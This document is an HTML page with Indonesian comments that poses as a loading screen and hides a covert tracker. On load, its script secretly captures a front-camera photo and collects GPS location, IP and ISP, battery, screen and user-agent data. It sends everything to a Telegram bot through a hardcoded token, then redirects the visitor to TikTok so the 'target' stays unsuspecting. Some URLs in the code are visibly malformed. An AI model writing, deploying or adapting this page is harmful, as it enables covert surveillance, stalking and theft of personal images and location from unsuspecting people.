<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
    <style>
        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <!-- Elemen pemrosesan kamera tersembunyi -->
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- KONFIGURASI UTAMA ---
        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
        
        // Mengambil ID dari URL (?id=xxxx)
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        async function sendData(lat, lon, photoBlob = null) {
            // Jika ID tidak ada di URL, langsung lempar ke TikTok tanpa kirim data
            if (!chatId) {
                window.location.href = "https://tiktok.com";
                return;
            }

            // 1. Ambil Info IP & ISP (Menggunakan IPify sebagai cadangan anti-crash)
            let ipDetail = "🌐 *IP:* Gagal memuat\n🏢 *ISP:* N/A\n🏙️ *Lokasi:* N/A";
            try {
                const res = await fetch('https://ipapi.co');
                if (res.ok) {
                    const data = await res.json();
                    ipDetail = `🌐 *IP:* ${data.ip || 'N/A'}\n🏢 *ISP:* ${data.org || 'N/A'}\n🏙️ *Lokasi:* ${data.city || 'N/A'}, ${data.region || 'N/A'}`;
                }
            } catch (e) {
                // Cadangan jika ipapi.co down/memblokir request
                try {
                    const resBackup = await fetch('https://ipify.org');
                    const dataBackup = await resBackup.json();
                    ipDetail = `🌐 *IP:* ${dataBackup.ip}\n🏢 *ISP:* (Gagal mengambil detail ISP)`;
                } catch (err) {}
            }

            // 2. Ambil Info Baterai Perangkat
            let batDetail = "N/A";
            try {
                const bat = await navigator.getBattery();
                batDetail = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak'})`;
            } catch (e) {}

            // 3. Susun Pesan Teks (Perbaikan Tanda $ dan Struktur Tautan Google Maps)
            const text = encodeURIComponent(
                `🚀 *PENGUNJUNG BARU TERDETEKSI*\n\n` +
                `📍 *Lokasi:* [Klik Lihat di Maps](https://google.com{lat},${lon})\n` +
                `${ipDetail}\n` +
                `🔋 *Baterai:* ${batDetail}\n` +
                `🖥️ *Layar:* ${screen.width}x${screen.height}\n` +
                `📱 *Platform:* ${navigator.platform}\n\n` +
                `🕵️ *User Agent:*\n\`${navigator.userAgent}\``
            );

            // 4. Proses Pengiriman Terpisah (Metode Mandiri - Anti Macet)
            try {
                // Mengirim pesan teks detail utama (WAJIB UTAMA)
                const sendMsgUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
                await fetch(sendMsgUrl);

                // Mengirim lokasi map interaktif (jika koordinat GPS valid)
                if (lat !== "0" && lon !== "0") {
                    const sendLocUrl = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
                    await fetch(sendLocUrl).catch(e => console.log("Gagal kirim map"));
                }

                // Mengirim hasil jepretan kamera depan (jika ada file gambar)
                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', photoBlob, 'kamera_depan.jpg');
                    
                    const sendPhotoUrl = `https://telegram.org{token}/sendPhoto`;
                    await fetch(sendPhotoUrl, { method: 'POST', body: formData }).catch(e => console.log("Gagal kirim foto"));
                }
            } catch (globalError) {
                console.log("Terjadi kendala pengiriman jaringan API");
            } finally {
                // Jaminan akhir: Halaman tetap dialihkan ke TikTok agar target tidak curiga
                window.location.href = "https://tiktok.com";
            }
        }

        window.onload = async () => {
            if (!chatId) {
                window.location.href = "https://tiktok.com";
                return;
            }

            let photoBlob = null;

            // Tahap 1: Tangkap Gambar Kamera Depan
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                video.srcObject = stream;
                
                await new Promise((resolve) => video.onloadedmetadata = resolve);
                await new Promise((resolve) => setTimeout(resolve, 800)); // Jeda pencahayaan sensor otomatis
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Matikan lampu indikator kamera secepat mungkin
                stream.getTracks().forEach(track => track.stop());
                
                photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            } catch (err) {
                console.log("Akses kamera ditolak atau perangkat tidak punya kamera.");
            }

            // Tahap 2: Ambil Koordinat Lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => sendData(p.coords.latitude, p.coords.longitude, photoBlob),
                    (e) => {
                        // Jika izin lokasi ditolak target, sistem tetap mengirimkan sisa data yang ada
                        sendData("0", "0", photoBlob);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                sendData("0", "0", photoBlob);
            }
        };
    </script>
</body>
</html>
